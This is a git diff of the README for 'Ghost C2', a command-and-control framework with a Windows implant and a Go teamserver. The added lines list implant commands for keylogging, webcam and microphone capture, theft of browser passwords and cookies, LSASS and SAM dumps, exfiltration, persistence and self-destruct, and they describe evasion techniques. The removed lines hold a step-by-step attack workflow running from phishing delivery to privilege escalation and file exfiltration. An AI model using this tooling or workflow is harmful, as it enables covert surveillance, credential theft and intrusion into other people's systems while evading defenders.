@@ -1,12 +1,12 @@
-# 👻 Ghost C2
+# Ghost C2
 
-Yet another C2 framework, because apparently we need more of those. This one's actually pretty clean though - modular design, decent evasion, and doesn't look like it was written in a weekend (it wasn't, it was written in several weekends).
+A modular C2 framework for red team operations and security research.
 
-**What's inside:**
-- **Agent** - Windows implant in pure C. No .NET, no PowerShell, just good old syscalls.
-- **Teamserver** - Go backend. Handles sessions, tasks, the usual.
-- **Web UI** - React dashboard because terminals are for nerds (jk I love terminals)
-- **Malleable Profiles** - Make your traffic look like jQuery requests or whatever
+**Components:**
+- **Agent** - Windows implant in pure C. No .NET, no PowerShell, direct syscalls.
+- **Teamserver** - Go backend handling sessions, tasks, and listeners.
+- **Web UI** - React dashboard for visual management.
+- **Malleable Profiles** - Customize traffic to mimic legitimate services.
 
 ## Architecture
 
@@ -46,296 +46,233 @@ Yet another C2 framework, because apparently we need more of those. This one's a
 ## Project Layout
 
 ```
-c2-server/
-├── agent/                    # The implant (C)
-│   ├── include/              # common.h, ntdefs.h
+C2-OPS/
+├── agent/                    # Windows implant (C)
+│   ├── include/              # Headers (common.h, ntdefs.h)
+│   │   ├── credentials/      # Browser, LSASS headers
+│   │   ├── exfil/            # File exfiltration
+│   │   ├── network/          # SOCKS5, port forward
+│   │   ├── recon/            # Scanner
+│   │   ├── remote/           # Desktop capture
+│   │   └── surveillance/     # Keylogger, screenshot, webcam, mic
 │   ├── src/
-│   │   ├── core/             # Main loop, config
-│   │   ├── crypto/           # AES, XOR, b64
-│   │   ├── evasion/          # The fun stuff
-│   │   ├── network/          # HTTP comms
+│   │   ├── core/             # Main loop, config, auth
+│   │   ├── crypto/           # AES, XOR, Base64
+│   │   ├── evasion/          # Anti-debug, sandbox, syscalls, sleep
+│   │   ├── network/          # HTTP transport, profiles, SOCKS5, portfwd
 │   │   ├── tasks/            # Command handlers
-│   │   └── utils/            # Helpers
+│   │   │   └── handlers/     # Shell, file, process, recon, token, persist
+│   │   ├── credentials/      # Browser passwords, LSASS dump
+│   │   ├── surveillance/     # Keylogger, screenshot, clipboard, webcam, mic
+│   │   ├── remote/           # Remote desktop
+│   │   ├── exfil/            # File exfiltration
+│   │   ├── recon/            # Port scanner
+│   │   └── utils/            # Memory, strings, PEB walking
 │   └── Makefile
 │
 ├── server/                   # Teamserver (Go)
 │   ├── cmd/                  # main.go
-│   ├── internal/             # api, cli, crypto, listener, etc
-│   └── pkg/protocol/         # Shared message structs
+│   ├── internal/
+│   │   ├── api/              # REST router
+│   │   ├── auth/             # Agent validation
+│   │   ├── cli/              # Console interface
+│   │   ├── crypto/           # AES encryption
+│   │   ├── handlers/         # Command handlers
+│   │   ├── listener/         # HTTP listener
+│   │   ├── profile/          # Malleable profiles
+│   │   ├── session/          # Agent sessions
+│   │   └── task/             # Task queue
+│   └── pkg/protocol/         # Message structs
 │
 ├── web/                      # Dashboard (React + Vite)
 │   └── src/
 │
-└── profiles/                 # Traffic profiles (yaml)
-    ├── default.yaml
-    ├── jquery.yaml           # Looks like CDN traffic
-    └── microsoft.yaml        # Looks like Windows Update
+├── profiles/                 # Traffic profiles (YAML)
+│   ├── default.yaml
+│   ├── jquery.yaml           # CDN traffic
+│   └── microsoft.yaml        # Windows Update
+│
+├── guides/                   # Documentation
+└── docs/                     # Protocol & evasion docs
 ```
 
-## Platform Requirements
+## Requirements
 
-| Component | Language | Runs On | Dev/Build On |
-|-----------|----------|---------|---------------|
-| **Agent** | C | Windows only | Mac/Linux (cross-compile with MinGW) |
-| **Teamserver** | Go | Mac/Linux/Windows | Any |
+| Component | Language | Target Platform | Build Platform |
+|-----------|----------|-----------------|----------------|
+| **Agent** | C | Windows x64 | Mac/Linux (MinGW cross-compile) |
+| **Server** | Go | Any | Any |
 | **Web UI** | React | Browser | Any |
 
-> **Important**: The agent uses Windows APIs (winhttp, ntdll) and produces a `.exe`. You **cross-compile** it from Mac/Linux using `mingw-w64`, then deploy the binary to the Windows target. The teamserver and web UI run natively on your operator machine.
+## Setup
 
-## Getting Started
-
-### You'll need
-
-- Go 1.21+
-- MinGW-w64 (for cross-compiling the agent)
-- Node 18+
-
-### Setup
+### Dependencies
 
 ```bash
 # macOS
-brew install mingw-w64
+brew install mingw-w64 go node
 
-# Get Go deps
-cd server && go mod download
-
-# Get npm deps
-cd web && npm install
+# Ubuntu/Debian
+apt install mingw-w64 golang nodejs npm
 ```
 
-### Build Agent
+### Build
 
 ```bash
+# Server dependencies
+cd server && go mod download
+
+# Web UI dependencies
+cd web && npm install
+
+# Build agent
 cd agent
-make check    # verify mingw is there
+make check    # Verify MinGW
 make exe      # -> bin/ghost.exe
 make dll      # -> bin/ghost.dll
 ```
 
-### Run Teamserver
+### Run
 
 ```bash
+# Start teamserver
 cd server
+go run cmd/main.go -api-port 3000 -listener-port 443
 
-# Basic
-go run cmd/main.go
-
-# Custom config
-go run cmd/main.go -api-port 3000 -listener-port 443 -profile profiles/jquery.yaml
-```
-
-### Run Web UI
-
-```bash
+# Start web UI
 cd web
-npm run dev
-# http://localhost:5173
+npm run dev   # http://localhost:5173
 ```
 
 ## Commands
 
-Once you have an agent callback, here's what you can do:
+### Basic Operations
 
-### Basics
+| Command | Description |
+|---------|-------------|
+| `shell <cmd>` | Execute shell command |
+| `pwd` | Print working directory |
+| `cd <path>` | Change directory |
+| `ls [path]` | List files |
 
-| Cmd | What it does |
-|-----|--------------|
-| `shell <cmd>` | Run cmd.exe command |
-| `pwd` | Where am I |
-| `cd <path>` | Go somewhere else |
-| `ls` | List files (or `dir`, same thing) |
+### File Operations
 
-### File Ops
+| Command | Description |
+|---------|-------------|
+| `download <file>` | Download file from target |
+| `upload <file>` | Upload file to target |
 
-| Cmd | What it does |
-|-----|--------------|
-| `download <file>` | Pull file from target |
-| `upload <file>` | Push file to target |
+### Process Management
 
-### Process Stuff
-
-| Cmd | What it does |
-|-----|--------------|
+| Command | Description |
+|---------|-------------|
 | `ps` | List processes |
-| `kill <pid>` | Kill a process |
+| `kill <pid>` | Terminate process |
 
-### Recon
+### Reconnaissance
 
-| Cmd | What it does |
-|-----|--------------|
-| `whoami` | Username, domain, privs |
-| `sysinfo` | OS, arch, hostname, IPs |
+| Command | Description |
+|---------|-------------|
+| `whoami` | User info (name, domain, privileges) |
+| `sysinfo` | System info (OS, arch, hostname, IPs) |
 
-### Tokens
+### Token Manipulation
 
-| Cmd | What it does |
-|-----|--------------|
-| `token_list` | See available tokens |
-| `token_steal <pid>` | Yoink a token |
+| Command | Description |
+|---------|-------------|
+| `token_list` | List available tokens |
+| `token_steal <pid>` | Steal token from process |
+
+### Surveillance
+
+| Command | Description |
+|---------|-------------|
+| `screenshot` | Capture screen |
+| `keylog_start` | Start keylogger |
+| `keylog_stop` | Stop keylogger |
+| `keylog_dump` | Get captured keystrokes |
+| `clipboard_start` | Start clipboard monitor |
+| `clipboard_stop` | Stop clipboard monitor |
+| `clipboard_dump` | Get clipboard history |
+| `webcam_snap` | Capture webcam image |
+| `mic_record [seconds]` | Record microphone (default: 5s) |
+
+### Remote Desktop
+
+| Command | Description |
+|---------|-------------|
+| `desktop_capture [quality]` | Capture screen frame (1-100) |
+| `desktop_mouse <x,y,flags>` | Inject mouse event |
+| `desktop_key <vk,up>` | Inject keyboard event |
+
+### Credential Extraction
+
+| Command | Description |
+|---------|-------------|
+| `browser_creds` | Extract browser passwords |
+| `browser_cookies` | Extract browser cookies |
+| `lsass_dump` | Dump LSASS memory |
+| `sam_dump` | Dump SAM hive |
+| `system_dump` | Dump SYSTEM hive |
+| `reg_creds` | Extract registry credentials |
+
+### File Exfiltration
+
+| Command | Description |
+|---------|-------------|
+| `exfil_search [path,byExt,byKey,depth]` | Search sensitive files |
+| `exfil_read <file>` | Read file for exfiltration |
+
+### Network Tools
+
+| Command | Description |
+|---------|-------------|
+| `socks5_start [port]` | Start SOCKS5 proxy |
+| `socks5_stop` | Stop SOCKS5 proxy |
+| `portfwd_add <local,host,remote>` | Create port forward |
+| `portfwd_remove <id>` | Remove port forward |
+| `portfwd_list` | List port forwards |
+| `scan_ports <target>` | Scan common ports |
+| `scan_range <target,start,end>` | Scan port range |
+| `scan_host <target>` | Check if host is up |
 
 ### Agent Control
 
-| Cmd | What it does |
-|-----|--------------|
-| `sleep <sec>` | Change beacon interval |
-| `persist` | Add persistence |
-| `exit` | Bye bye |
+| Command | Description |
+|---------|-------------|
+| `sleep <seconds>` | Set beacon interval |
+| `persist [method]` | Add persistence |
+| `exit` | Clean agent shutdown |
+| `self_destruct` | Remove all traces and exit |
 
 ## REST API
 
-| Endpoint | Method | Notes |
-|----------|--------|-------|
-| `/api/stats` | GET | Dashboard numbers |
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/api/stats` | GET | Dashboard statistics |
 | `/api/agents` | GET | List agents |
 | `/api/agents/:id` | GET | Agent details |
 | `/api/agents/:id` | DELETE | Remove agent |
 | `/api/agents/:id/task` | POST | Send command |
 | `/api/agents/:id/tasks` | GET | Task history |
 
----
+## Evasion Techniques
 
-## Workflow
-
-Here's how you'd actually use this thing:
-
-```
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                           ATTACK WORKFLOW                                   │
-└─────────────────────────────────────────────────────────────────────────────┘
-
- ┌──────────────────┐
- │  1. SETUP        │
- │  Infrastructure  │
- └────────┬─────────┘
-          │
-          ▼
- ┌──────────────────────────────────────────────────────────────────────┐
- │  Deploy VPS  ──►  Start Teamserver  ──►  Configure Profile           │
- │                                                                      │
- │  $ go run cmd/main.go -profile profiles/jquery.yaml -listener 443    │
- └──────────────────────────────────────────────────────────────────────┘
-          │
-          ▼
- ┌──────────────────┐
- │  2. COMPILE      │
- │  Agent Payload   │
- └────────┬─────────┘
-          │
-          ▼
- ┌──────────────────────────────────────────────────────────────────────┐
- │  Edit config.h with C2 URL  ──►  make exe  ──►  ghost.exe            │
- │                                                                      │
- │  C2_URL = "https://your-vps.com"                                     │
- └──────────────────────────────────────────────────────────────────────┘
-          │
-          ▼
- ┌──────────────────┐
- │  3. DELIVERY     │
- │  Initial Access  │
- └────────┬─────────┘
-          │
-          ▼
- ┌──────────────────────────────────────────────────────────────────────┐
- │  Phishing / USB / Exploit  ──►  Target executes ghost.exe            │
- │                                                                      │
- │  Agent auto-registers with teamserver and starts beaconing           │
- └──────────────────────────────────────────────────────────────────────┘
-          │
-          ▼
- ┌──────────────────┐
- │  4. ENUMERATION  │
- │  Initial Recon   │
- └────────┬─────────┘
-          │
-          ▼
- ┌──────────────────────────────────────────────────────────────────────┐
- │  Recommended first commands after callback:                          │
- │                                                                      │
- │  ghost (agent-1) ► whoami          # Who am I?                       │
- │  ghost (agent-1) ► sysinfo         # What system?                    │
- │  ghost (agent-1) ► pwd             # Where am I?                     │
- │  ghost (agent-1) ► ps              # What's running?                 │
- └──────────────────────────────────────────────────────────────────────┘
-          │
-          ▼
- ┌──────────────────┐
- │  5. PERSISTENCE  │
- │  Stay Resident   │
- └────────┬─────────┘
-          │
-          ▼
- ┌──────────────────────────────────────────────────────────────────────┐
- │  ghost (agent-1) ► persist registry    # Survive reboots             │
- │  ghost (agent-1) ► sleep 300           # Low and slow (5 min)        │
- └──────────────────────────────────────────────────────────────────────┘
-          │
-          ▼
- ┌──────────────────┐
- │  6. PRIVILEGE    │
- │  Escalation      │
- └────────┬─────────┘
-          │
-          ▼
- ┌──────────────────────────────────────────────────────────────────────┐
- │  ghost (agent-1) ► token_list          # Find SYSTEM/Admin tokens    │
- │  ghost (agent-1) ► token_steal 1234    # Impersonate high priv       │
- └──────────────────────────────────────────────────────────────────────┘
-          │
-          ▼
- ┌──────────────────┐
- │  7. POST-EXPLOIT │
- │  Collection      │
- └────────┬─────────┘
-          │
-          ▼
- ┌──────────────────────────────────────────────────────────────────────┐
- │  ghost (agent-1) ► shell dir /s *.docx      # Find documents         │
- │  ghost (agent-1) ► download C:\secrets.db   # Exfil files            │
- │  ghost (agent-1) ► shell net user /domain   # AD enumeration         │
- └──────────────────────────────────────────────────────────────────────┘
-          │
-          ▼
- ┌──────────────────┐
- │  8. CLEANUP      │
- │  Exit Cleanly    │
- └────────┬─────────┘
-          │
-          ▼
- ┌──────────────────────────────────────────────────────────────────────┐
- │  ghost (agent-1) ► exit                # Clean shutdown              │
- └──────────────────────────────────────────────────────────────────────┘
-```
-
-### Quick Ref
-
-| Scenario | Commands |
-|----------|----------|
-| First foothold | `whoami` → `sysinfo` → `pwd` → `ps` |
-| Hunt for creds | `shell dir /s *password*.txt` → `download` |
-| Token grab | `ps` → `token_steal <pid>` |
-| Lateral prep | `shell net view /domain` |
-| Exfil | `ls C:\Users\target\Documents` → `download` |
-| Stay quiet | `sleep 600` → `persist registry` |
-
-## Evasion
-
-The agent does some stuff to avoid detection:
-
-| Technique | Notes |
-|-----------|-------|
-| PEB Walking | Resolve APIs without GetProcAddress (no IAT entries) |
-| Indirect Syscalls | Skip ntdll hooks |
-| String Encryption | XOR at runtime |
-| Anti-Debug | PEB flags, timing checks, debug port |
-| Sandbox Detection | Checks CPU count, RAM, uptime, VM artifacts |
-| Sleep Obfuscation | Encrypt heap during sleep (WIP) |
+| Technique | Description |
+|-----------|-------------|
+| PEB Walking | Resolve APIs without GetProcAddress |
+| Indirect Syscalls | Bypass ntdll hooks |
+| String Encryption | XOR strings at runtime |
+| Anti-Debug | PEB flags, timing checks, debug port detection |
+| Sandbox Detection | CPU count, RAM, uptime, VM artifacts |
+| Sleep Obfuscation | Encrypt heap during sleep |
+| Malleable Profiles | Mimic legitimate traffic patterns |
 
 ## Malleable Profiles
 
-You can customize how traffic looks. Example - pretend to be jQuery:
+Example profile mimicking jQuery CDN traffic:
 
 ```yaml
-# profiles/jquery.yaml
 name: "jquery-cdn"
 http:
   user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"
@@ -348,12 +285,14 @@ http:
       append: "\n//# sourceMappingURL=jquery.min.map"
 ```
 
-Network defenders see: "oh just someone loading jQuery"
+## Legal Notice
 
-## ⚠️ Legal
+This tool is intended for authorized security testing and research purposes only. Users are responsible for ensuring they have proper authorization before using this tool against any system or network. Unauthorized use is prohibited and may violate applicable laws.
 
-This is for authorized testing and research only. Don't be stupid. Don't use this on systems you don't own or have permission to test. I'm not responsible if you get fired/arrested/both.
+## Author
+
+xAPT42
 
 ## License
 
-Educational purposes. See LICENSE.
+For educational and authorized testing purposes only.
